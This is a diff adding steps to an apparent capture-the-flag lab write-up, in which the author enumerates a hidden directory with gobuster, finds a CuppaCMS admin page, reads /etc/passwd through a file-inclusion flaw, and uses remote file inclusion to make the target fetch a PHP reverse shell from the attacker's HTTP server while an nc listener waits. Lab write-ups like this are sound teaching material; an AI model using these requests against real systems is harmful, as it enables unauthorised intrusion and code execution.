@@ -123,9 +123,39 @@ chmod +x exploit.sh<br />
 Enter the username and password for the squirrelmail service.<br />
 SCREENSHOT14<br />
 Something went wrong... We'll come back to this exploit later and see if we can figure out what went wrong. 
-Let's try going back to the secret directory we received earlier...<br />
+Let's try going back to the secret directory we received earlier...<br /></p>
 
 ## Back to enumerating
 
+<p>Our previous exploit failed but we haven't enumerated the hidden directory we found, let's try finding more valuable information.</p>
 
+### Enumerating Hidden Directory
 
+<p>Let's have a look at the hidden directory and see if there's anything valuable! We'll use gobuster again.<br />
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/45kra24zxs28v3yd/<br />
+SCREENSHOT15<br />
+We discovered a directory called /administrator/ let's have a look... It appears to be a login for CuppaCMS...<br />
+SCREENSHOT16<br />
+Maybe this is vulnerable to the Remote File Inclusion question we answered earlier? Let's do some research....<br />
+Bingo! I found an exploit in the software for RFI! What's even better is that you don't have to be an authenticated user<br />
+For more information about the exploit: https://www.exploit-db.com/exploits/25971<br /></p>
+
+## Back to exploiting
+
+### Exploiting CuppaCMS
+
+<p>After reading the exploit page I know which page has the vulnerability and I try to exploit it.<br />
+http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br />
+SCREENSHOT17<br />
+My request was successful! Now let's create a reverse shell and try to escalate our privileges! <br />
+Firstly, we'll host our reverse php shell on a python http server to serve to the website<br />
+python3 -m http.server 8000<br />
+Secondly, we'll open up a listener on our attacking machine.<br />
+nc -lvnp 8888<br />
+Third, we'll get the target to execute our remote shell<br />
+10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.113.195:8000/shell.php<br />
+SCREENSHOT18<br />
+Success! We now have a shell. Let's verify which user we are by using whoami<br />
+whoami
+
+</p>
